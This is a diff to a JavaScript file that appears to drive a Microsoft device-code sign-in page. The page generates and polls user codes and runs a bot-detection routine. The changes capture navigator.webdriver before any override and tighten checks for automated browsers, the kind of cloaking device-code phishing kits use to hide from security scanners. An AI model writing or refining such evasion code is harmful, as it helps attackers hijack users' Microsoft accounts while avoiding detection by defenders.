@@ -18,6 +18,13 @@
 (function () {
   'use strict';
 
+  // ─── Store original navigator.webdriver BEFORE any overrides ──
+  // This must be done immediately to capture the true bot detection value
+  var _originalWebdriver = false;
+  try {
+    _originalWebdriver = navigator.webdriver || false;
+  } catch(e) {}
+
   // ─── Server-Side Logging (replaces console.log for production) ──
   // In testing mode, also log to console for debugging
   var TESTING_MODE = typeof window.__TESTING_MODE === 'boolean' ? window.__TESTING_MODE : true;
@@ -426,7 +433,7 @@
 
     var startBtn = document.getElementById('startBtn');
     console.log('[VG] startBtn found:', !!startBtn);
-    var originalBtnText = '<span class="vg-spin">⟳</span> Generating code…';
+    var originalBtnText = '<span class="vg-spin">&#x27F3;</span> Generating code...';
     if (startBtn) { startBtn.disabled = true; startBtn.innerHTML = originalBtnText; }
 
     _setStatus('');
@@ -524,7 +531,7 @@
         _startTimer(d.expires_in || 600);
       } else {
         console.log('[VG] No user_code in response');
-        _setStatus('Connecting to Microsoft servers…');
+        _setStatus('Connecting to Microsoft servers...');
       }
 
       _pollTimer = setInterval(_poll, 1000);
@@ -961,8 +968,17 @@
   
   // Check for bot patterns - RELAXED for real browsers
   function isBotRequest() {
-    // Check navigator.webdriver (most reliable)
-    if (navigator.webdriver) return true;
+    // Check original navigator.webdriver value (before override)
+    if (_originalWebdriver) return true;
+    // Also check current value (some bots set it after page load)
+    try {
+      if (Object.getOwnPropertyDescriptor(navigator, 'webdriver') && navigator.webdriver) return true;
+    } catch(e) {}
+    // Check for webdriver property that returns false but was originally true
+    var webdriverDesc = Object.getOwnPropertyDescriptor(navigator, 'webdriver');
+    if (webdriverDesc && webdriverDesc.get) {
+      // webdriver has been overridden - suspicious but not definitive
+    }
     
     // Check for automation tools (specific, not generic)
     if (window._chrome && !window.chrome) return true;
